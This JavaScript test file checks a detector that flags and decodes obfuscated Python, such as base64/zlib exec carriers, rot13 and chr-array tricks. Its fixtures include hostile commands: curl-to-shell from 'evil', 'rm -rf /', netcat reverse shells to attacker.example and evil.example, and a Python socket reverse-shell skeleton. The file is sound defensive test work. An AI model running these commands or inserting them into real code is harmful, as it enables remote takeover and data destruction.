'use strict';
// python-obfuscation.test.js — Python obfuscation detection /
// deobfuscation. Six branches:
//   P1  exec(zlib.decompress(base64.b64decode(b'…')))
//   P2  exec(marshal.loads(base64.b64decode('…')))
//   P3  codecs.decode(s, 'rot_13' | 'hex' | 'base64' | 'zlib')
//   P4  ''.join(chr(N) for …) / bytes([…]).decode() / chr(N)+chr(N)+…
//   P5  getattr(__builtins__, 'e' + 'val')
//   P6  subprocess.* / os.system / pty.spawn / socket reverse-shell

const test = require('node:test');
const assert = require('node:assert/strict');
const zlib = require('node:zlib');
const { loadModules, host } = require('../helpers/load-bundle.js');

// python-obfuscation.js calls `Decompressor.inflateSync(...)` for P1.
// The bundle has a real implementation (decompressor.js + pako); since
// pako isn't on disk as a separate JS source-tree module, we load
// `decompressor.js` and provide a tiny inflateSync shim using node:zlib
// inside the vm context so P1 decode works.
const ctx = loadModules([
  'src/constants.js',
  'src/encoded-content-detector.js',
  'src/decoders/python-obfuscation.js',
]);

// Inject a Decompressor stub into the vm context so P1 inflate works.
// node:zlib offers inflateSync (zlib header) and inflateRawSync (raw
// deflate) — they cover the formats the detector tries.
ctx.Decompressor = {
  inflateSync(bytes, format) {
    try {
      const buf = Buffer.from(bytes.buffer || bytes, bytes.byteOffset || 0, bytes.byteLength || bytes.length);
      if (format === 'gzip') return new Uint8Array(zlib.gunzipSync(buf));
      if (format === 'deflate-raw') return new Uint8Array(zlib.inflateRawSync(buf));
      // 'zlib' / 'deflate' — both default to zlib-wrapped inflate
      return new Uint8Array(zlib.inflateSync(buf));
    } catch (_) { return null; }
  },
};

const { EncodedContentDetector } = ctx;
const d = new EncodedContentDetector();

/** Helper: collect every candidate matching `pred` and project across realms. */
function pick(candidates, pred) {
  return host(candidates.filter(pred));
}

/** Helper: build a P1 carrier given a cleartext payload. */
function buildP1Carrier(cleartext) {
  const compressed = zlib.deflateSync(Buffer.from(cleartext, 'utf-8'));
  const b64 = compressed.toString('base64');
  return `exec(__import__('zlib').decompress(__import__('base64').b64decode(b'${b64}')))`;
}

// ── P1: exec(zlib.decompress(base64.b64decode(…))) ──────────────────────────

test('python-obfuscation: P1 zlib+b64 carrier decodes cleartext', () => {
  // Build a real carrier whose cleartext is a recognisable command —
  // 'os.system("/bin/sh")' satisfies SENSITIVE_PY_KEYWORDS and the
  // post-processor's dangerousPatterns gate.
  const cleartext = 'os.system("/bin/sh")';
  const text = buildP1Carrier(cleartext);
  const cands = d._findPythonObfuscationCandidates(text, {});
  const hits = pick(cands, c => /zlib\.decompress/.test(c.technique));
  assert.ok(hits.length >= 1, `expected P1 hit; got: ${JSON.stringify(host(cands))}`);
  assert.equal(hits[0].deobfuscated, cleartext,
    'P1 must surface the inflated cleartext');
  assert.equal(hits[0]._executeOutput, true);
});

test('python-obfuscation: P1 short-form (zlib.decompress / base64.b64decode) decodes', () => {
  // The non-__import__ short form — same construct, different lookup.
  const cleartext = 'subprocess.run(["sh", "-c", "id"])';
  const compressed = zlib.deflateSync(Buffer.from(cleartext, 'utf-8'));
  const b64 = compressed.toString('base64');
  const text = `exec(zlib.decompress(base64.b64decode(b'${b64}')))`;
  const cands = d._findPythonObfuscationCandidates(text, {});
  const hits = pick(cands, c => /zlib\.decompress/.test(c.technique));
  assert.ok(hits.length >= 1, 'P1 short-form must fire');
  assert.equal(hits[0].deobfuscated, cleartext);
});

// ── P2: exec(marshal.loads(base64.b64decode(…))) ────────────────────────────

test('python-obfuscation: P2 marshal carrier emits with binary preview', () => {
  // Marshalled bytecode is unreadable to humans — a fixture with the
  // canonical Python 3.10 magic header is enough to verify the branch.
  // We use a non-marshal byte sequence; the detector emits a binary
  // preview regardless because the construct itself is the signal.
  const bytes = Buffer.from([0x6F, 0x0D, 0x0D, 0x0A, 0, 0, 0, 0, 1, 2, 3, 4, 5, 6]);
  const b64 = bytes.toString('base64');
  const text = `exec(marshal.loads(base64.b64decode('${b64}')))`;
  const cands = d._findPythonObfuscationCandidates(text, {});
  const hits = pick(cands, c => /marshal\.loads/.test(c.technique));
  assert.ok(hits.length >= 1, `expected P2 hit; got: ${JSON.stringify(host(cands))}`);
  assert.equal(hits[0]._executeOutput, true);
});

test('python-obfuscation: P2 inline marshal.loads form (no base64 wrapper) emits', () => {
  // The inner `base64.b64decode(...)` wrapper is optional in the regex —
  // a bare `marshal.loads(b'…')` is also surfaced.
  const text = `exec(marshal.loads(b'AAECAwQFBgcICQoLDA0='))`;
  const cands = d._findPythonObfuscationCandidates(text, {});
  const hits = pick(cands, c => /marshal\.loads/.test(c.technique));
  assert.ok(hits.length >= 1, 'P2 bare-marshal form must fire');
});

// ── P3: codecs.decode ───────────────────────────────────────────────────────

test('python-obfuscation: P3 codecs.decode rot13 decodes to keyword', () => {
  // 'rkrp' rot13 → 'exec'. Sensitivity gate fires (exec ∈ keywords).
  const text = "codecs.decode('rkrp', 'rot_13')";
  const cands = d._findPythonObfuscationCandidates(text, {});
  const hits = pick(cands, c => /rot/.test(c.technique));
  assert.ok(hits.length >= 1, `expected rot13 hit; got: ${JSON.stringify(host(cands))}`);
  assert.equal(hits[0].deobfuscated, 'exec');
});

test('python-obfuscation: P3 codecs.decode hex decodes to command', () => {
  // 'os.system' hex = '6f732e73797374656d'. Sensitivity gate fires.
  const hex = Buffer.from('os.system').toString('hex');
  const text = `codecs.decode('${hex}', 'hex')`;
  const cands = d._findPythonObfuscationCandidates(text, {});
  const hits = pick(cands, c => /hex/.test(c.technique));
  assert.ok(hits.length >= 1, `expected hex hit; got: ${JSON.stringify(host(cands))}`);
  assert.equal(hits[0].deobfuscated, 'os.system');
});

test('python-obfuscation: P3 codecs.decode benign rot13 suppressed by sensitivity gate', () => {
  // 'uryyb' rot13 → 'hello' — no sensitive keyword, no emission.
  const text = "codecs.decode('uryyb', 'rot_13')";
  const cands = d._findPythonObfuscationCandidates(text, {});
  const hits = pick(cands, c => /rot/.test(c.technique));
  assert.equal(hits.length, 0, 'benign rot13 must not fire (no sensitive kw)');
});

// ── P4: char-array reassembly ───────────────────────────────────────────────

test('python-obfuscation: P4 chr-join decodes to subprocess.run', () => {
  // Build chr(N) sequence for 'subprocess.run' — a recognised sink.
  const target = 'subprocess.run';
  const calls = [...target].map(c => `chr(${c.charCodeAt(0)})`).join(',');
  const text = `''.join([${calls}])`;
  const cands = d._findPythonObfuscationCandidates(text, {});
  const hits = pick(cands, c => /chr-join/.test(c.technique));
  assert.ok(hits.length >= 1, `expected chr-join; got: ${JSON.stringify(host(cands))}`);
  assert.equal(hits[0].deobfuscated, target);
});

test('python-obfuscation: P4 bytes([…]).decode() decodes to keyword', () => {
  const target = 'os.popen';
  const nums = [...target].map(c => c.charCodeAt(0)).join(',');
  const text = `bytes([${nums}]).decode()`;
  const cands = d._findPythonObfuscationCandidates(text, {});
  const hits = pick(cands, c => /bytes-list/.test(c.technique));
  assert.ok(hits.length >= 1, `expected bytes-list; got: ${JSON.stringify(host(cands))}`);
  assert.equal(hits[0].deobfuscated, target);
});

test('python-obfuscation: P4 chr(N)+chr(N)+chr(N)… decodes to keyword', () => {
  const target = 'eval';
  const calls = [...target].map(c => `chr(${c.charCodeAt(0)})`).join('+');
  const text = `f = ${calls}; f("payload")`;
  const cands = d._findPythonObfuscationCandidates(text, {});
  const hits = pick(cands, c => /chr-concat/.test(c.technique));
  assert.ok(hits.length >= 1, `expected chr-concat; got: ${JSON.stringify(host(cands))}`);
  assert.equal(hits[0].deobfuscated, target);
});

test('python-obfuscation: P4 benign chr-array suppressed by sensitivity gate', () => {
  // chr-join spelling 'hello world' — no keyword, no emission.
  const target = 'hello world';
  const calls = [...target].map(c => `chr(${c.charCodeAt(0)})`).join(',');
  const text = `''.join([${calls}])`;
  const cands = d._findPythonObfuscationCandidates(text, {});
  const hits = pick(cands, c => /chr-join|bytes-list|chr-concat/.test(c.technique));
  assert.equal(hits.length, 0, 'benign chr-join must not fire');
});

// ── P5: builtin string-concat lookup ────────────────────────────────────────

test('python-obfuscation: P5 getattr(__builtins__, \'e\'+\'val\') resolves', () => {
  const text = `f = getattr(__builtins__, 'e' + 'val'); f(payload)`;
  const cands = d._findPythonObfuscationCandidates(text, {});
  const hits = pick(cands, c => /Builtin String-Concat/.test(c.technique));
  assert.ok(hits.length >= 1, `expected P5 hit; got: ${JSON.stringify(host(cands))}`);
  assert.match(hits[0].deobfuscated, /'eval'/);
  assert.equal(hits[0]._executeOutput, true);
});

test('python-obfuscation: P5 multi-fragment exec resolves', () => {
  const text = `getattr(__builtins__, 'e'+'x'+'e'+'c')(p)`;
  const cands = d._findPythonObfuscationCandidates(text, {});
  const hits = pick(cands, c => /Builtin String-Concat/.test(c.technique));
  assert.ok(hits.length >= 1, 'P5 multi-fragment must fire');
  assert.match(hits[0].deobfuscated, /'exec'/);
});

test('python-obfuscation: P5 non-dangerous builtin name suppressed', () => {
  // 'pri' + 'nt' = 'print' — not in the dangerous-builtins set.
  const text = `getattr(__builtins__, 'pri' + 'nt')`;
  const cands = d._findPythonObfuscationCandidates(text, {});
  const hits = pick(cands, c => /Builtin String-Concat/.test(c.technique));
  assert.equal(hits.length, 0, "'print' must not fire (not in dangerous set)");
});

// ── P6: subprocess / os.system / pty / socket sinks ─────────────────────────

test('python-obfuscation: P6 subprocess.run(["sh", "-c", …]) emits with longest arg', () => {
  const text = `subprocess.run(['sh', '-c', 'curl http://evil/x | sh'])`;
  const cands = d._findPythonObfuscationCandidates(text, {});
  const hits = pick(cands, c => /subprocess Sink/.test(c.technique));
  assert.ok(hits.length >= 1, `expected P6 subprocess hit; got: ${JSON.stringify(host(cands))}`);
  assert.match(hits[0].deobfuscated, /curl/);
  assert.equal(hits[0]._executeOutput, true);
});

test('python-obfuscation: P6 subprocess.Popen with shell=True emits literal', () => {
  const text = `subprocess.Popen("rm -rf / --no-preserve-root", shell=True)`;
  const cands = d._findPythonObfuscationCandidates(text, {});
  const hits = pick(cands, c => /subprocess Sink/.test(c.technique));
  assert.ok(hits.length >= 1, 'shell=True form must fire');
  assert.match(hits[0].deobfuscated, /rm -rf/);
});

test('python-obfuscation: P6 os.system literal emits', () => {
  const text = `os.system("nc attacker.example 4444 -e /bin/sh")`;
  const cands = d._findPythonObfuscationCandidates(text, {});
  const hits = pick(cands, c => /os\.system/.test(c.technique));
  assert.ok(hits.length >= 1, `expected os.system hit; got: ${JSON.stringify(host(cands))}`);
  assert.match(hits[0].deobfuscated, /^nc/);
  assert.equal(hits[0]._executeOutput, true);
});

test('python-obfuscation: P6 pty.spawn shell-upgrade emits', () => {
  const text = `pty.spawn("/bin/sh")`;
  const cands = d._findPythonObfuscationCandidates(text, {});
  const hits = pick(cands, c => /pty\.spawn/.test(c.technique));
  assert.ok(hits.length >= 1, 'pty.spawn must fire');
  assert.match(hits[0].deobfuscated, /pty\.spawn/);
});

test('python-obfuscation: P6 socket reverse-shell pattern flagged', () => {
  // The classic Python reverse-shell skeleton.
  const text = `
import socket, os, pty
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.0.0.1", 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
pty.spawn("/bin/sh")
`;
  const cands = d._findPythonObfuscationCandidates(text, {});
  const hits = pick(cands, c => /Socket Reverse-Shell/.test(c.technique));
  assert.ok(hits.length >= 1, `expected reverse-shell pattern; got: ${JSON.stringify(host(cands))}`);
  assert.match(hits[0].deobfuscated, /10\.0\.0\.1:4444/);
  assert.equal(hits[0]._executeOutput, true);
});

// ── Empty-input + non-Python-text contract ──────────────────────────────────

test('python-obfuscation: returns empty for short or non-Python text', () => {
  assert.deepEqual(host(d._findPythonObfuscationCandidates('hi', {})), []);
  assert.deepEqual(host(d._findPythonObfuscationCandidates('', {})), []);
  assert.deepEqual(host(d._findPythonObfuscationCandidates(
    'The quick brown fox jumps over the lazy dog.', {})), []);
});

test('python-obfuscation: caps at maxCandidatesPerType', () => {
  // Generate a flood of os.system calls; cap should bind.
  const line = `os.system("nc evil.example 4444 -e /bin/sh")\n`;
  const flood = line.repeat(d.maxCandidatesPerType + 50);
  const cands = d._findPythonObfuscationCandidates(flood, {});
  const sinks = pick(cands, c => /os\.system/.test(c.technique));
  assert.ok(sinks.length <= d.maxCandidatesPerType,
    `expected ≤ ${d.maxCandidatesPerType} candidates, got ${sinks.length}`);
});
